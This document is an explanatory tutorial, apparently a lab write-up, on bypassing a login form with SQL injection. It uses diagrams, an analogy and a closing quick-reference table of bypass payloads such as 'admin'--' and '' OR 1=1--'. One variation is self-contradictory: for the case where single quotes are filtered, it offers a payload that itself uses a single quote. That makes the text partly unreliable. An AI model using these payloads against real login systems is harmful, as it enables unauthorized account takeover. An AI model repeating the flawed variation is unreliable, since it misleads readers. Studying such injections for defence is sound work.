# SUBVERTING APPLICATION LOGIC - CONCEPT & PERFORMANCE EXPLAINED

Let me break down exactly what's happening in this login bypass attack, from concept to execution.

---

## THE CONCEPT (What's Happening)

### Normal Thinking vs. Attacker Thinking

**Normal User Thinking:**
> "I need to provide BOTH a valid username AND the correct password to log in."

**Attacker Thinking:**
> "How can I make the database ignore the password check entirely?"

---

## THE MECHANICS (How It Performs)

### Step 1: Understanding the Original Query

The application takes your input and builds a query:

```sql
SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
```

**Visual Representation:**
```
┌─────────────────────────────────────────────────────────────┐
│ SELECT * FROM users WHERE                                    │
│    username = 'wiener' AND password = 'bluecheese'           │
│                ↑______↑            ↑_________↑               │
│              Your input           Your input                 │
│            (controlled by you)  (controlled by you)          │
└─────────────────────────────────────────────────────────────┘
```

### Step 2: The Attacker's Input

The attacker enters:
- **Username:** `administrator'--`
- **Password:** `(left blank)`

### Step 3: How the Query Gets Built

The application blindly plugs the username into the query:

```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
```

**Let's visualize what the database sees:**

```
┌─────────────────────────────────────────────────────────────┐
│ SELECT * FROM users WHERE                                    │
│    username = 'administrator'--' AND password = ''           │
│                ↑____________↑                                │
│              Your malicious input                            │
│                                                              │
│  The -- tells the database: "Ignore everything after me!"    │
│                                                              │
│  So the database actually executes:                          │
│  SELECT * FROM users WHERE username = 'administrator'        │
└─────────────────────────────────────────────────────────────┘
```

---

## BREAKDOWN OF THE MAGIC

### What Each Part Does:

| Part | What It Does |
|------|--------------|
| `administrator` | The username you want to login as |
| `'` | Closes the opening quote in the query |
| `--` | SQL comment symbol - tells database to ignore rest of line |

### The Transformation:

**Original intended query:**
```sql
WHERE username = '[your input]' AND password = '[your input]'
```

**After injection:**
```sql
WHERE username = 'administrator'--' AND password = ''
```

**What database actually runs:**
```sql
WHERE username = 'administrator'
```

**The `AND password = ''` part is GONE!** The database never checks it.

---

## ANALOGY TO UNDERSTAND

### The "Security Guard" Analogy

Imagine a security guard at a VIP party with a checklist:

**Normal Check:**
> Guard: "Are you **admin**? AND do you have the **secret password**?"
> Person: "I'm admin, and here's 'bluecheese'"
> Guard: "✅ Both true, you may enter"

**SQL Injection Attack:**
> Attacker says: "I'm **admin'--**"
> 
> Guard hears: "I'm admin" 
> ***(the '--' magically makes the guard deaf to everything after)***
> 
> Guard forgets to ask for password and says: "Oh, you're admin? Come in!"

---

## REAL EXAMPLE WALKTHROUGH

### Target: `https://example.com/login`

**Login Form:**
```
Username: [                ]
Password: [                ]
        [ LOGIN ]
```

### Attack Execution:

**Step 1:** Enter payload
```
Username: [ administrator'-- ]
Password: [ anything (or blank) ]
        [ LOGIN ]
```

**Step 2:** Application builds query
```sql
SELECT * FROM users WHERE username = 'administrator'--' AND password = 'anything'
```

**Step 3:** Database processes
- Looks for user where username = 'administrator'
- Sees `--` and stops reading
- Never checks password
- Finds admin user
- Returns user record

**Step 4:** Application sees user record returned
- "Query returned a user? Login successful!"
- Redirects attacker to admin panel

---

## WHY THIS IS SO DANGEROUS

### 1. No Password Needed
```
No brute force
No guessing
No cracking
Just type and enter
```

### 2. Works on Any Account
```
administrator'--  → login as admin
john'--          → login as john
ceo'--           → login as CEO
```

### 3. Instant Access
Time to bypass: **2 seconds**
Access gained: **Full account access**

---

## VARIATIONS OF THIS ATTACK

### If you don't know a username:
```
Username: ' OR 1=1--
Password: anything
```
**Result:** Logs in as FIRST user in database (often admin)

### If the application filters -- :
```
Username: admin'#
Password: anything
```
**Result:** Same effect (MySQL uses # for comments)

### If single quotes are filtered:
```
Username: admin'--
Password: anything
```
**Result:** Still works if they use different quotes

---

## VISUAL FLOW

```
┌─────────────────┐
│  Login Page     │
│  User: admin'-- │
│  Pass: [blank]  │
│  [LOGIN]        │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Application    │
│  Builds Query:  │
│  SELECT * FROM  │
│  users WHERE    │
│  username='admin│
│  '--' AND pass= │
│  ''             │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Database       │
│  Sees:          │
│  username='admin│
│  '-- stops      │
│  reading here   │
│  Password check │
│  IGNORED!       │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Database       │
│  Finds admin    │
│  user record    │
│  Returns it     │
└────────┬────────┘
         ↓
┌─────────────────┐
│  Application    │
│  "Query returned│
│  a user?        │
│  Login SUCCESS!"│
└────────┬────────┘
         ↓
┌─────────────────┐
│  Attacker       │
│  NOW LOGGED IN  │
│  AS ADMIN!      │
└─────────────────┘
```

---

## QUICK REFERENCE CARD

| If you want to... | Use this payload |
|-------------------|------------------|
| Login as specific user | `admin'--` |
| Login as first user | `' OR 1=1--` |
| Login as specific with OR | `admin' OR '1'='1'--` |
| MySQL database | `admin'#` |
| When -- is filtered | Try `admin'/*` |

---

## THE BOTTOM LINE

**This attack works because:**
1. The application trusts user input
2. It builds queries by concatenating strings
3. The attacker uses `'` to break out of the string
4. The attacker uses `--` to delete the rest of the query
5. The database only checks what's left (just the username)

**Result:** You're logged in as whoever you claimed to be, no password required!